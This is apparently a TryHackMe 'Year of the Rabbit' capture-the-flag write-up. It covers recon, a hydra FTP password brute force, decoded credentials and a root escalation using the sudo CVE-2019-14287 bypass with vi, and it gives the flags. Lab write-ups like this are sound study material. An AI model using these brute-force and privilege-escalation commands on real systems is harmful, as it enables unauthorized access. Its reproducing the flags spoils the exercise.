# Year of the Rabbit


## Task 1

```
export IP=10.10.102.97
```

### 1 -- What is the user flag?

Basic nmap scan:
```bash
jeffrowell@kali:~/Documents/TryHackMe/Year of the Rabbit$ nmap -sC -sV -Pn -n -oN nmap/initial $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-24 19:15 MDT
Nmap scan report for 10.10.102.97
Host is up (0.13s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.97 seconds
```

Basic gobuster scan finds a directory `/assets` that just has a rick roll video:
```bash
jeffrowell@kali:~/Documents/TryHackMe/Year of the Rabbit$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.102.97
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/24 19:14:48 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/.hta (Status: 403)
/assets (Status: 301)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2020/05/24 19:16:02 Finished
===============================================================
```

First thing was to look at the `/assets` directory where we found a `RickRolled.mp4` and a `styles.css` file. Don't look at the `RickRolled.mp4` file, that's a rabbit hole!


![assets](https://user-images.githubusercontent.com/32188816/82776468-5919a000-9e08-11ea-83ba-0243e62284f5.png)

However, in the css file we have a hint to look at `/sup3r_s3cr3t_fl4g.php`:

![super_secret_flkag](https://user-images.githubusercontent.com/32188816/82776257-94679f00-9e07-11ea-95fc-6b0ef522689d.png)

Once we go the the `/sup3r_s3cr3t_fl4g.php` endpoint, we are alerted to turn off our javascript:

![turn_off_js](https://user-images.githubusercontent.com/32188816/82776364-e6102980-9e07-11ea-9f38-c45a0e33374b.png)

Turning off javascript and trying to view the page led back down another rabit hole, as it just displayed the rick rolled video again:

![js_off](https://user-images.githubusercontent.com/32188816/82776522-7f3f4000-9e08-11ea-91d5-8422f6c3e2a6.png)

So let's try to set up a proxy through BurpSuite and see what the request is doing without javascript involved. When doing that, we see that there is another network request redirecting to `/intermediary.php` with a hidden_directory parameter of `/WExYY2Cv`:

![burp_hidden_dir](https://user-images.githubusercontent.com/32188816/82776605-b9a8dd00-9e08-11ea-983c-4ad3ce79f059.png)

When we navigate to that hidden directory, we are given one png file:

![hot_babe](https://user-images.githubusercontent.com/32188816/82776703-0db3c180-9e09-11ea-9ec6-84b6c4c8667a.png)

Let's download the file and do some stego analysis on it. First thing running binwalk on the png file we downloaded gives us some output:
```bash
jeffrowell@kali:~/Documents/TryHackMe/Year of the Rabbit$ binwalk -e Hot_Babe.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 512 x 512, 8-bit/color RGB, non-interlaced
54            0x36            Zlib compressed data, best compression
```

Turns out that was a deadend. But running strings on the image gave some useful output at the very end of the output:

```
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&Nmu?
FfF~sfu^UQZmT
8FF?iKO27b~V0
ua4W~2-@y7dE$
3j39aMQQ7xFXT
Wb4--CTc4ww*-
u6oY9?nHv84D&
0iBp4W69Gr_Yf
TS*%miyPsGV54
C77O3FIy0c0sd
O14xEhgg0Hxz1
5dpv#Pr$wqH7F
1G8Ucoce1+gS5
0plnI%f0~Jw71
0kLoLzfhqq8u&
kS9pn5yiFGj6d
zeff4#!b5Ib_n
rNT4E4SHDGBkl
KKH5zy23+S0@B
3r6PHtM4NzJjE
gm0!!EC1A0I2?
HPHr!j00RaDEi
7N+J9BYSp4uaY
PYKt-ebvtmWoC
3TN%cD_E6zm*s
eo?@c!ly3&=0Z
nR8&FXz$ZPelN
eE4Mu53UkKHx#
86?004F9!o49d
SNGY0JjA5@0EE
trm64++JZ7R6E
3zJuGL~8KmiK^
CR-ItthsH%9du
yP9kft386bB8G
A-*eE3L@!4W5o
GoM^$82l&GA5D
1t$4$g$I+V_BH
0XxpTd90Vt8OL
j0CN?Z#8Bp69_
G#h~9@5E5QA5l
DRWNM7auXF7@j
Fw!if_=kk7Oqz
92d5r$uyw!vaE
c-AA7a2u!W2*?
zy8z3kBi#2e36
J5%2Hn+7I6QLt
gL$2fmgnq8vI*
Etb?i?Kj4R=QM
7CabD7kwY7=ri
4uaIRX~-cY6K4
kY1oxscv4EB2d
k32?3^x1ex7#o
ep4IPQ_=ku@V8
tQxFJ909rd1y2
5L6kpPR5E2Msn
65NX66Wv~oFP2
LRAQ@zcBphn!1
V4bt3*58Z32Xe
ki^t!+uqB?DyI
5iez1wGXKfPKQ
nJ90XzX&AnF5v
7EiMd5!r%=18c
wYyx6Eq-T^9#@
yT2o$2exo~UdW
ZuI-8!JyI6iRS
PTKM6RsLWZ1&^
3O$oC~%XUlRO@
KW3fjzWpUGHSW
nTzl5f=9eS&*W
WS9x0ZF=x1%8z
Sr4*E4NT5fOhS
hLR3xQV*gHYuC
4P3QgF5kflszS
NIZ2D%d58*v@R
0rJ7p%6Axm05K
94rU30Zx45z5c
Vi^Qf+u%0*q_S
1Fvdp&bNl3#&l
zLH%Ot0Bw&c%9
```

Nice, so we now have the username to the FTP service we found open earlier, so we cam make a list of these potential passwords and feed it to hydra and get the FTP creds:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Year of the Rabbit$ hydra -l ftpuser -P ftp_password_list ftp://$IP
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-24 20:25:38
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task
[DATA] attacking ftp://10.10.102.97:21/
[21][ftp] host: 10.10.102.97   login: ftpuser   password: 5iez1wGXKfPKQ
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-24 20:26:05
```

Lets FTP to the box and see what it has:

```bash
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             758 Jan 23 01:48 Eli's_Creds.txt
226 Directory send OK.
```

It has one file, `Eli'_Creds.txt`, so we can get that file down and take a look at it:
```bash
ftp> get Eli's_Creds.txt
local: Eli's_Creds.txt remote: Eli's_Creds.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Eli's_Creds.txt (758 bytes).
226 Transfer complete.
758 bytes received in 0.00 secs (3.9719 MB/s)
```

When we cat the file, it seemingly is an esoteric language:
```bash
jeffrowell@kali:~/Documents/TryHackMe/Year of the Rabbit$ cat Eli\'s_Creds.txt
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <
```

This looks like `brainfuck`, so we can [decode this here](https://copy.sh/brainfuck/) and get some SSH creds:


![brainfuck](https://user-images.githubusercontent.com/32188816/82776910-b6fab780-9e09-11ea-87d2-6b6a47172141.png)

Now we can log in as eli. When we first log in there is an interesting message displayed:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Year of the Rabbit$ ssh eli@$IP
eli@10.10.102.97's password:

1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE
```

There doesn't seem to be a user flag anywhere on the box. Usually there would be a flag somewhere in `eli`'s home directory, but there is another user `gwendoline` in the `/home` directory, and in their home is a file `user.txt`:

![home](https://user-images.githubusercontent.com/32188816/82777132-794a5e80-9e0a-11ea-8ecb-2e23ec5f986a.png)

So we need to escalate to `gwendoline` and using the hint message when we logged in maybe we can search for files/directories with `s3cr3t` in the name and see if we can find the hidden message:

```bash
eli@year-of-the-rabbit:~$ find / -name 's3cr3t' 2>/dev/null
/usr/games/s3cr3t
```

Nice. So we change into the `/usr/games/s3cr3t` directory and look around, which leads to `gwendoline`'s password:

```#!/usr/bin/env bash
eli@year-of-the-rabbit:~$ cd /usr/games/s3cr3t/
eli@year-of-the-rabbit:/usr/games/s3cr3t$ ls -a
.  ..  .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
Your password is awful, Gwendoline.
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root
```

At last we can log in and get the user flag:
```
jeffrowell@kali:~/Documents/TryHackMe/Year of the Rabbit$ ssh gwendoline@$IP
gwendoline@10.10.102.97's password:


1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE




gwendoline@year-of-the-rabbit:~$ id
uid=1001(gwendoline) gid=1001(gwendoline) groups=1001(gwendoline)
gwendoline@year-of-the-rabbit:~$ ls
user.txt
gwendoline@year-of-the-rabbit:~$ cat user.txt
THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
```

### 2 -- What is the root flag?

Once we are logged in as gwndoline, lets check what we can run as root:

```bash
gwendoline@year-of-the-rabbit:~$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
gwendoline@year-of-the-rabbit:~$ sudo -V
Sudo version 1.8.10p3
Sudoers policy plugin version 1.8.10p3
Sudoers file grammar version 43
Sudoers I/O plugin version 1.8.10p3
```

Interesting, this looks like sudo is vulnerable to [CVE-2019-14287](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287). So what we can do, is run that particular command to vi the user flag, but once in the vi editor we can execute arbitrary commands which in turn will be ran as the root user.

First to exploit the vulnerability we will need to specify the exact comand `/usr/bin/vi /home/gwendoline/user.txt` as the payload after the CVE-2019-14287 exploit `sudo -u#-1`:

```bash
gwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

After running this command we will get dropped into the vi editor with the `user.txt` file. Once there, we can leverage the `:sh` command within vi that will start a shell specified by the `$SHELL` variable:

![run_sh](https://user-images.githubusercontent.com/32188816/82776093-0095d300-9e07-11ea-8b84-01bc2b853f0d.png)

Since vi is being run as root due to the CVE-2019-14287 exploit, we get a root shell and can obtain the flag:

```bash
root@year-of-the-rabbit:/home/gwendoline# id
uid=0(root) gid=0(root) groups=0(root)
root@year-of-the-rabbit:/home/gwendoline# cd /root
root@year-of-the-rabbit:/root# ls
root.txt
root@year-of-the-rabbit:/root# cat root.txt
THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
```
